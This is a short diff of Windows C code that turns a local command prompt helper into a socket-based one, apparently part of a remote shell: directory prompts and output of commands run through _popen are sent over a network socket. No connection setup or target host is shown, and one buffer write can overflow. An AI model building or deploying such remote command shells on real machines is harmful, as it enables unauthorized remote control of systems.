@@ -6,14 +6,14 @@ bool isChangeDir(const char *cmd){
     return false;
 }
 
-void currentPromtPrint(void){
+void promtPrint(SOCKET s){
     char buf[LEN_PROMT];
+    DWORD len = 0;
     ZeroMemory(buf, LEN_PROMT);
-    GetCurrentDirectory(LEN_PROMT, buf);
-    if(buf[strlen(buf) - 1] == '\\')
-        printf("\n%s>", buf);
-    else
-        printf("\n%s>", buf);
+    len = GetCurrentDirectory(LEN_PROMT, buf);
+    buf[len] = '\0';
+    strcat(buf, ">");
+    send(s, buf, len + 1, 0);
 }
 
 bool changeDir(char *path){
@@ -29,12 +29,14 @@ bool changeDir(char *path){
     return SetCurrentDirectory(currDir);
 }
 
-void shell(char *cmd){
+void shell(SOCKET s, char *cmd){
     FILE *file = NULL;
     char buf[LEN_BUF] = {'\0'};
+    int byte = 0;
     if((file = _popen(cmd, "r")) != NULL){
-        while(fgets(buf, sizeof(buf), file) != NULL){
-            printf("%s", buf);
+        while((byte = read(fileno(file), buf, sizeof(buf))) > 0){
+            buf[byte] = '\0';
+            send(s, buf, byte, 0);
         }
         fclose(file);
     }
